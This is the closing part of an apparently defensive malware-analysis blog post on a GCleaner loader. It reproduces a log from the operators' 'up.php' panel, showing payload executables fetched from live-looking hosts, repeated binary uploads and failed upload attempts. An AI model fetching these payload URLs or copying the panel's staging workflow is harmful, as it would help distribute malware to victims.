+13/12/2023 12:10 up.php -&gt; MIXTWO -&gt; http://http://stoon.hitsturbo.com/order/tuc7.exe -&gt; downloaded &lt; 1024
+13/12/2023 12:10 up.php -&gt; MIXTWO -&gt; http://http://stoon.hitsturbo.com/order/tuc7.exe -&gt; downloaded &lt; 1024
+13/12/2023 12:10 up.php -&gt; MIXTWO -&gt; http://http://stoon.hitsturbo.com/order/tuc7.exe -&gt; downloaded &lt; 1024
+13/12/2023 12:10 up.php -&gt; MIXTWO -&gt; http://http://stoon.hitsturbo.com/order/tuc7.exe -&gt; downloaded &lt; 1024
+13/12/2023 12:10 up.php -&gt; MIXTWO -&gt; http://http://stoon.hitsturbo.com/order/tuc7.exe -&gt; downloaded &lt; 1024
+13/12/2023 12:12 up.php -&gt; mixtwo -&gt; http://http://stoon.hitsturbo.com/order/tuc7.exe -&gt; downloaded &lt; 1024
+13/12/2023 12:12 up.php -&gt; mixtwo -&gt; http://http://stoon.hitsturbo.com/order/tuc7.exe -&gt; downloaded &lt; 1024
+13/12/2023 12:12 up.php -&gt; mixtwo -&gt; http://http://stoon.hitsturbo.com/order/tuc7.exe -&gt; downloaded &lt; 1024
+13/12/2023 12:20 up.php -&gt; MIXTWO -&gt; http://stoon.hitsturbo.com/order/tuc7.exe -&gt; download error
+13/12/2023 12:20 up.php -&gt; MIXTWO -&gt; http://stoon.hitsturbo.com/order/tuc7.exe -&gt; download error
+13/12/2023 12:20 up.php -&gt; MIXTWO -&gt; http://stoon.hitsturbo.com/order/tuc7.exe -&gt; download error
+13/12/2023 12:20 up.php -&gt; MIXTWO -&gt; http://stoon.hitsturbo.com/order/tuc7.exe -&gt; download error
+13/12/2023 12:20 up.php -&gt; MIXTWO -&gt; http://stoon.hitsturbo.com/order/tuc7.exe -&gt; download error
+13/12/2023 12:20 up.php -&gt; MIXTWO -&gt; http://stoon.hitsturbo.com/order/tuc7.exe -&gt; download error
+13/12/2023 12:20 up.php -&gt; MIXTWO -&gt; http://stoon.hitsturbo.com/order/tuc7.exe -&gt; download error
+13/12/2023 12:20 up.php -&gt; MIXTWO -&gt; http://stoon.hitsturbo.com/order/tuc7.exe -&gt; download error
+13/12/2023 12:20 up.php -&gt; MIXTWO -&gt; http://stoon.hitsturbo.com/order/tuc7.exe -&gt; download error
+13/12/2023 12:21 up.php -&gt; MIXTWO -&gt; http://stoon.hitsturbo.com/order/tuc7.exe -&gt; download error
+13/12/2023 12:23 up.php -&gt; MIXTWO -&gt; http://stoon.hitsturbo.com/order/tuc7.exe -&gt; downloaded 7463965b
+14/12/2023 15:31 up.php -&gt; MIXTWO -&gt; uploaded 84992b
+14/12/2023 16:27 up.php -&gt; MIXTWO -&gt; uploaded 4608b
+14/12/2023 16:30 up.php -&gt; MIXTWO -&gt; http://stoon.hitsturbo.com/order/tuc7.exe -&gt; downloaded 7580388b
+15/12/2023 19:08 up.php -&gt; MIXTWO -&gt; uploaded 4608b
+15/12/2023 19:08 up.php -&gt; MIXTWO -&gt; uploaded 158208b
+16/12/2023 17:27 up.php -&gt; MIXTWO -&gt; uploaded 4608b
+17/12/2023 13:30 up.php -&gt; MIXTWO -&gt; uploaded 587086b
+17/12/2023 19:26 up.php -&gt; MIXTWO -&gt; uploaded 4608b
+26/12/2023 14:03 up.php -&gt; MIXTWO -&gt; uploaded 1382912b
+26/12/2023 17:41 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+)
+
+05/01/2024 18:34 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:34 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:34 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:44 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:58 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:58 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:58 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:58 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:58 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:58 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:58 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:58 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:58 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:58 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:58 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:58 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:58 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:58 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:58 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:58 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:59 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 18:59 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 19:12 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 19:12 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 19:13 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 19:13 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 19:13 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 19:13 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 19:19 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+05/01/2024 19:19 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTWO',
+)
+POST array (
+)
+FILES array (
+  'uploadfile' =&gt; 
+  array (
+    'name' =&gt; '2103799296 mixtwo.exe',
+    'full_path' =&gt; '2103799296 mixtwo.exe',
+    'type' =&gt; '',
+    'tmp_name' =&gt; '',
+    'error' =&gt; 1,
+    'size' =&gt; 0,
+  ),
+)
+
+06/01/2024 00:48 up.php -&gt; MIXTEST -&gt; uploaded 267191b
+06/01/2024 00:49 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTEST',
+)
+POST array (
+)
+FILES array (
+)
+
+06/01/2024 00:57 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTEST',
+)
+POST array (
+)
+FILES array (
+)
+
+06/01/2024 01:00 up.php -&gt; MIXTEST -&gt; uploaded 267191b
+06/01/2024 01:00 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTEST',
+)
+POST array (
+)
+FILES array (
+)
+
+06/01/2024 01:01 up.php -&gt; ELSE 
+GET array (
+  'stream' =&gt; 'MIXTEST',
+)
+POST array (
+)
+FILES array (
+)
+
+06/01/2024 01:02 up.php -&gt; MIXTEST -&gt; uploaded 8152176b
+06/01/2024 01:03 up.php -&gt; MIXTEST -&gt; uploaded 25226464b
+06/01/2024 08:02 up.php -&gt; MIXTWO -&gt; uploaded 4608b
+06/01/2024 08:02 up.php -&gt; MIXTWO -&gt; uploaded 970501b
+06/01/2024 23:12 up.php -&gt; MIXTWO -&gt; uploaded 347136b
+07/01/2024 00:11 up.php -&gt; MIXTWO -&gt; uploaded 346624b
+07/01/2024 01:12 up.php -&gt; MIXTWO -&gt; https://arbiscan.eu/apple.exe -&gt; downloaded 346624b
+08/01/2024 19:19 up.php -&gt; MIXTWO -&gt; uploaded 404992b
+08/01/2024 20:38 up.php -&gt; MIXTWO -&gt; uploaded 415744b
+08/01/2024 21:14 up.php -&gt; MIXTWO -&gt; uploaded 415232b
+09/01/2024 05:28 up.php -&gt; MIXTWO -&gt; https://arbiscan.eu/apple.exe -&gt; downloaded 415232b
+09/01/2024 06:06 up.php -&gt; MIXTWO -&gt; uploaded 393216b
+09/01/2024 07:49 up.php -&gt; MIXTWO -&gt; https://arbiscan.eu/apple.exe -&gt; downloaded 393216b
+10/01/2024 04:59 up.php -&gt; two -&gt; uploaded 372736b
+10/01/2024 13:27 up.php -&gt; two -&gt; uploaded 372224b
+10/01/2024 22:28 up.php -&gt; two -&gt; uploaded 4608b
+11/01/2024 18:01 up.php -&gt; two -&gt; uploaded 1340007b
+12/01/2024 12:21 up.php -&gt; two -&gt; uploaded 1270132b
+13/01/2024 12:09 up.php -&gt; two -&gt; uploaded 1236456b
+15/01/2024 13:30 up.php -&gt; two -&gt; uploaded 1220326b</code></pre>
+
+</div>
+</div>
+</div>
+</div>
+
+
+
+  </div><a class="u-url" href="/gcleaner/loader/debugging/encryption/opendir/2024/03/17/new-gcleaner.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
